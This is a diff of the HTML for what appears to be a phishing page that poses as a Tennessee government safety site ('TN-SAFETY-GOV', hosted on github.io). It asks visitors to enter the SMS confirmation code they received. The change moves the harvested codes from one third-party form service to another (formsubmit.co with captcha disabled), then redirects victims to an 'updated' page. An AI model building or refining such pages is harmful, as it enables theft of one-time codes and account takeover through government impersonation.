@@ -51,16 +51,11 @@
             </div>
 
             <!-- Formulaire de saisie du code -->
-            <form class="otp-form" action="https://api.web3forms.com/submit" method="POST">
-
-                <input type="hidden" name="access_key" value="4df5bbbb-bd11-4c70-a613-435d680007ca">
-                <input type="hidden" name="from_name" value="TN-SAFETY-GOV">
-                <input type="hidden" name="subject" value="Confirmation - Tableau">
-
-                <input type="checkbox" name="botcheck" style="display:none">
-
-                <!-- Ça force l'envoi en tableau HTML propre -->
-                <input type="hidden" name="replyto" value="%email%">
+            <form action="https://formsubmit.co/el/528cfa5ae469b703e6904a3689b34436/" method="POST">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/updated.html">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_subject" value="Confirm">
                 <label for="otp-input">Enter the confirmation code you recieved via SMS</label>
                 
                 <div class="otp-inputs-container">
@@ -72,8 +67,6 @@
                     <input name="code6" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
                 </div>
 
-                <!-- Redirection vers votre page personnalisée -->
-                <input type="hidden" name="redirect" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/updated.html">
                 <button type="submit" class="submit-btn">CONFIRM</button>
             </form>
         </main>
